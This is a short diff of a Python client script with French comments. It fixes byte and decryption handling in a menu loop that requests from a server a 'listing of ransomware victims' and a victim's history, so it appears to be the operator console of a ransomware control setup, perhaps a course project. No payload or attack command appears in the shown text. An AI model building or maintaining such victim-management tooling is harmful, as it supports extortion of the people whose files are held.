@@ -25,7 +25,7 @@ def main():
     # hasAsked 1 Before = Check si il a demander un listing avant
     # de vouloir check un historique.
     hasAsked = False
-    get_keys = s.recv(2048).decode('utf-8')
+    get_keys = s.recv(2048)
     key = get_keys[2:-1]
     print(str(key))
     while choix != '4':
@@ -45,10 +45,11 @@ def main():
             d = message.list_victim_req()
             s.send(bytes(d, 'utf-8'))
             # On récupère la réponse en écoutant
-            data = s.recv(8192).decode('utf-8')
-            data_e = security.decrypt(bytes(data, 'utf-8'), bytes(key, 'utf-8'))
+            data = s.recv(8192)
+            data_e = security.decrypt(data, key)
             print('LISTING DES VICTIMES DU RANSOMWARE\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-            print(str(data_e))
+            print(data_e)
+            print('\n')
         elif choix == '2':
             if hasAsked:
                 # On demande au serveur frontale l'historique d'une victime
